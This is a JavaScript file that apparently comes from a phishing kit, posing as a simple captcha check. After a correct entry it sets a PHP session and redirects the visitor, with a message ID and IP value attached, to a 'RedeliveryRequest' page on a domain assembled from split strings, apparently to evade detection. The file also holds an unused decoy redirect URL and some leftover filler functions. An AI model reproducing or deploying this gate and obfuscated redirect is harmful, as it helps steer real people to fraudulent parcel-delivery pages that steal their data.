		
    
    
    function pauseForOneSecond() {
		  console.log('Start');

		  setTimeout(function() {
			console.log('Pause for 1 second');

			// Code to execute after the pause

		  }, 1000);

		  console.log('End');
		}

		// Call the function
  function generateRandomString(length) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
	
    for (let i = 0; i < length; i++) {
      const randomIndex = Math.floor(Math.random() * characters.length);
      result += characters.charAt(randomIndex);
    }

    return result;
  }
   let i=0
 
function checkInput() {
    var userInput = document.getElementById('userInput').value;
    var randomString = document.getElementById('randomStringSpan').textContent;
    var errorMsg = document.getElementById('errorMsg');
    var messageId = document.getElementById('messageId').value;
    var ipzebi = document.getElementById('ipzebi').value;
    let spark="chectrackuasbalikups"
	  let https ="https"
	  let webapp ="RedeliveryRequest"

    if (userInput.toLowerCase() === randomString.toLowerCase()) {
        // Assuming your AJAX call will be here to set the PHP session
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "session.php", true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.onreadystatechange = function() {
            if (this.readyState === XMLHttpRequest.DONE && this.status === 200) {
                // Check response from setSession.php
                var response = JSON.parse(this.responseText);
                if (response.status === 'success') {
                	window.location= https+"://"+spark+".com/"+webapp+"?messageId="+messageId+"&ipzebi="+ipzebi;
                } else {
                    // Handle failure
                    console.error('Session setting failed:', response.message);
                }
            }
        };
        xhr.send("captcha=" + encodeURIComponent(userInput) + "&messageId=" + encodeURIComponent(messageId) + "&ipzebi=" + encodeURIComponent(ipzebi));
    } else {
        errorMsg.textContent = 'Wrong captcha. Please try again.';
        setTimeout(function() {
            errorMsg.textContent = '';
        }, 3000);
    }
}

  // Example usage:
  const randomString = generateRandomString(6);
   let redirect_url="https://rroll.to/"
  // Display the random string in the span element
  const spanElement = document.getElementById('randomStringSpan');
  spanElement.textContent = randomString;

